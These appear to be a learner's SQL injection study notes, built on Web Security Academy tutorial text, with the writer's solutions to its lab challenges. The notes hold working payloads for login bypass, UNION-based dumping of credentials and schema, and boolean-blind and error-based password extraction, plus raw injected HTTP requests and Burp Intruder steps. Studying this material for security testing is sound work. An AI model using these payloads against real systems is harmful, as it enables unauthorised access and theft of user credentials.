# What is SQL injection (SQLi)?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

# How to detect SQL injection vulnerabilities
You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

The single quote character ' and look for errors or other anomalies.
Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

## SQL injection in different parts of the query
Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.

However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

In UPDATE statements, within the updated values or the WHERE clause.
In INSERT statements, within the inserted values.
In SELECT statements, within the table or column name.
In SELECT statements, within the ORDER BY clause.

# Retrieving hidden data
Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

https://insecure-website.com/products?category=Gifts
This causes the application to make a SQL query to retrieve details of the relevant products from the database:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This SQL query asks the database to return:

all details (*)
from the products table
where the category is Gifts
and released is 1.
The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

https://insecure-website.com/products?category=Gifts'+OR+1=1--
This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.

Warning
Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

# Subverting application logic
Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
This query returns the user whose username is administrator and successfully logs the attacker in as that user.

# SQL injection UNION attacks
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:

SELECT a, b FROM table1 UNION SELECT c, d FROM table2
This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.
To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

How many columns are being returned from the original query.
Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns required
When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

The ORDER BY position number 3 is out of range of the number of items in the select list.
The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.


The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
If the number of nulls does not match the number of columns, the database returns an error, such as:

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

### Challenge
In Shop, determine the number of columns in the query by using the UNION injection technique. 
Vulnerabilities was in the categories filter for the shop. By adding the payload ```' UNION NULL,NULL,NULL --``` I was able to find that there are three columns. 
https://0ada00d6045bf2a780398acb006300ca.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--

# Database-specific syntax
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

' UNION SELECT NULL FROM DUAL--
The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

For more details of database-specific syntax, see the SQL injection cheat sheet.

## Finding columns with a useful data type
A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
If the column data type is not compatible with string data, the injected query will cause a database error, such as:

Conversion failed when converting the varchar value 'a' to data type int.
If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

### Challenge
Using Union injection techniques, find the column containing text (strings). 
First, I find the number of coulmns in Shop's category filter again with the UNION NULL technique - https://0a3900db04b810b680bd6c3f0068007f.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
Then, we start replacing each of the nulls iteratively with the letter a, or any character, until we find the column that doesn't error out. Multiple columns might work. The character needs to be encased in single quotes. 
It was the second column in this case - https://0a3900db04b810b680bd6c3f0068007f.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20SELECT%20NULL,%27a%27,NULL%20--
Once found, I had to made the database retrieve a specific string 'SIHTLj' to solve the challenge. 

# Using a SQL injection UNION attack to retrieve interesting data
When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

The original query returns two columns, both of which can hold string data.
The injection point is a quoted string within the WHERE clause.
The database contains a table called users with the columns username and password.
In this example, you can retrieve the contents of the users table by submitting the input:

' UNION SELECT username, password FROM users--
In order to perform this attack, you need to know that there is a table called users with two columns called username and password. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

## Challenge
Retrieve username and password for administrator and log in as him in Shop.
https://0aff00d004cba3b98170bba400b60010.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20username,%20password%20FROM%20users--


# Retrieving multiple values within a single column
In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

' UNION SELECT username || '~' || password FROM users--
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

The results from the query contain all the usernames and passwords, for example:

...
administrator~s3cure
wiener~peter
carlos~montoya
...

## Challenge
Find the username and password using concatination from the categories vulnerable to SQLi in Shop. 
First find the column number and which one holds the strings:
Columns - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL--
Strings - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,%27abc%27--
Now concatenate the username and password fields from the users table - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
Where the concatination was ``` 'UNION SELECT NULL,username||'~'||password FROM users--```

# Examining the database in SQL injection attacks
To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

The type and version of the database software.
The tables and columns that the database contains.

## Querying the database type and version
You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

### Database type	Query
Microsoft, MySQL	```SELECT @@version```
Oracle	```SELECT * FROM v$version```
PostgreSQL	```SELECT version()```
For example, you could use a UNION attack with the following input:

```' UNION SELECT @@version--```
This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Challenge

In Shop, retrieve the version string from a Microsoft or MySQL database via the categories SQLi. 
https://0a16000704c7fa748121757300f70013.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20ALL%20SELECT%20NULL,version()%20--%20-

The solution payload didn't actually work in this case, I ended up using SQLmap to find payloads that did work and then made the above one on my own. 

# Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database:

``` SELECT * FROM information_schema.tables```
This returns output like the following:

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:

``` SELECT * FROM information_schema.columns WHERE table_name = 'Users'```
This returns output like the following:

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
This output shows the columns in the specified table and the data type of each column.

## Challenge
Get the database and table information out of the database in Shop via the Category param vulnerability to get the username and password for administrator then login. 

First, determine number of columns. 
Second, list table names from information_schema.tables - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Third, select the column names from the table from information_schema.columns - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns%20WHERE%20table_name=%27users_brauzl%27--
Finally, extract the usernames and passwords from the table users_brauzl and the columns found - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20username_onopjk,%20password_bikvfm%20FROM%20users_brauzl%20--

# Blind SQL injection
In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.

## What is blind SQL injection?
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm```
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Next, we send the following input:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't```
This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's```
We can continue this process to systematically determine the full password for the Administrator user.

Note
The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet.

### Challenge
In Shop, find the SQL injection (trackingId cookie) and then use blind boolean methods to uncover the administrator's password to login. 

Found the SQLi by conducting a simple 1=1 boolean injection on the cookie which when 1=2 we did not get the "Welcome Back" tracking banner but when 1=1 we did. 
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+'1'='2'--; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Then, we check to see if there is a username that starts with 'a' in the users table:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users LIMIT 1)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Then, validate that the username is indeed administrator:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Determine the length of the administrators password by asking if it is true that the length is greater than 19 which it is but it is not greater than 20:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Next, we're looking to find all 20 characters to the password. 
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
The above request gets sent to intruder where we section  mark the last 'a' and iterate through it along with each position until we find the complete password. Each 'true' letter is confirmed by the "Welcome Back" message being displayed which we can filter for in intruder. 

# Error-based SQL injection
Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.

## Exploiting blind SQL injection by triggering conditional errors
Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:

With the first input, the CASE expression evaluates to 'a', which does not cause any error.
With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### Challenge
In Shop, this one is using an Oracle DB, find the username and password for the administrator and login. 
Found the injection is in the trackingID cookie again but this time there is no Welcome Back banner. Instead, it throws and error when I append a single quote. Appending double single quotes fixes the query so that's the injection point. 
Next, we need to try to find a predictable database name for Oracle and see if we can get info from it, for this I used ```'||(SELECT '' FROM dual)||'```
```
GET /filter?category=Gifts HTTP/2
Host: 0a26004603ad956483044797002a0054.web-security-academy.net
Cookie: TrackingId=b2qz4FN3jzJ5SshUv'||(SELECT '' FROM dual)||'; session=mhReDB1XnUY34J9i3trzjI3C9SDSW1eF
```
This returned a valid response which was then verified by changing dual to 'foo' which threw another error. So we can infer true statements by whether or not the server throws an error. 

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
Modify the TrackingId cookie, appending a single quotation mark to it:

TrackingId=xyz'
Verify that an error message is received.

Now change it to two quotation marks:
TrackingId=xyz''
Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

TrackingId=xyz'||(SELECT '')||'
In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

TrackingId=xyz'||(SELECT '' FROM dual)||'
As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

You can also exploit this behavior to test conditions. First, submit the following query:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that an error message is received.

Now change it to:

TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Verify that the condition is true (the error is received), confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Then send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
Go to Burp Intruder and change the value of the cookie to:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
Launch the attack by clicking the " Start attack" button.
Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Launch the modified attack, review the results, and note the character at the second offset.
Continue this process testing offset 3, 4, and so on, until you have the whole password.
In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.

# Extracting sensitive data via verbose SQL error messages
Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:

Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the CAST() function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```
CAST((SELECT example_column FROM example_table) AS int)
```
Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:
```
ERROR: invalid input syntax for type integer: "Example data"
```
This type of query may also be useful if a character limit prevents you from triggering conditional responses.
